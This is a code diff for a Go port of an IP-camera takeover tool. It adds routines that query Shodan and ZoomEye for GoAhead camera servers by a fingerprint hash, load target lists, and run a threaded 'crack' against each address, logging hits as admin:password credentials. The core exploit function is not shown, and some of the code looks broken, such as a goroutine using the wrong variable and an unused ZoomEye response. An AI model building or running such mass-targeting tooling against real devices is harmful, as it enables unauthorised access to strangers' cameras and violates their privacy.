@@ -2,12 +2,15 @@ package camover
 
 import (
 	"bufio"
+	"context"
 	"flag"
 	"fmt"
+	"net/http"
 	"os"
 	"sync"
 	"time"
 
+	"github.com/ns3777k/go-shodan/v4/shodan"
 	"github.com/seaung/camover-go/pkg/logger"
 )
 
@@ -57,6 +60,14 @@ func (cli *CamOverCli) crackAddresses(addresses []string) {
 
 		go func(addr string) {
 			defer wg.Done()
+            if cli.thread(addr) {
+                results := fmt.Sprintf("(%s) - %s:%s", address, "admin", "password")
+                if output != "" {
+                    cli.writeFile(output, results)
+                } else {
+                    cli.Logger.Process(results)
+                }
+            }
 		}(addr)
 	}
 
@@ -118,14 +129,88 @@ func (cli *CamOverCli) writeFile(path, results string) error {
     return nil
 }
 
-func (cli *CamOverCli) exploit(address string) (*CamOverResult, error) {
-	return nil, nil
+func (cli *CamOverCli) crackTargetFromFile(path string) {
+    fs, err := os.Open(path)
+    if err != nil {
+        cli.Logger.Warning("Failed to open input file : " + err.Error())
+        fs.Close()
+        return
+    }
+
+    defer fs.Close()
+
+    addresses := make([]string, 0)
+    scanner := bufio.NewScanner(fs)
+    for scanner.Scan() {
+        addresses = append(addresses, scanner.Text())
+    }
+
+    cli.crackAddresses(addresses)
 }
 
-func (cli *CamOverCli) start() {}
+func (cli *CamOverCli) handleShodan() {
+    var addresses []string
+    httpClient := &http.Client{}
+    client := shodan.NewClient(httpClient, shodanKey)
+
+    result, err := client.GetHostsForQuery(context.Background(), &shodan.HostQueryOptions{Query: "GoAhead 5ccc069c403ebaf9f0171e9517f40e41"})
+
+    if err != nil {
+        cli.Logger.Errorw(err.Error())
+        return
+    }
+
+    for _, item := range result.Matches {
+        addresses = append(addresses, fmt.Sprintf("%s:%s", item.IP.String(), item.Port))
+    }
+
+    cli.crackAddresses(addresses)
+}
+
+func (cli *CamOverCli) handleZoomeye() {
+    url := fmt.Sprintf("https://api.zoomeye.org/host/search?query=GoAhead 5ccc069c403ebaf9f0171e9517f40e41&page=%d", pages)
+    client := &http.Client{}
+
+    request, err := http.NewRequest(http.MethodGet, url, nil)
+    if err != nil {
+        cli.Logger.Warning(err.Error())
+        return
+    }
+
+    request.Header.Set("Authorization", zoomeyeKey)
+
+    response, err := client.Do(request)
+    if err != nil {
+        cli.Logger.Errorw(err.Error())
+        return
+    }
+
+    defer response.Body.Close()
+}
+
+func (cli *CamOverCli) start() {
+    if output != "" {
+        if _, err := os.Stat(output);os.IsNotExist(err) {
+            cli.Logger.Errorw("Input file does not exist : " + err.Error())
+        }
+    }
+
+    if zoomeyeKey != "" {
+        cli.handleZoomeye()
+    } else if shodanKey != "" {
+        cli.handleShodan()
+    } else if input != "" {
+        cli.crackTargetFromFile(input)
+    } else if address != "" {
+        cli.thread(address)
+    } else {
+        flag.PrintDefaults()
+    }
+}
 
 func Run() {
     cli := NewCamOverCli()
+    cli.initOptions()
     cli.start()
 }
 
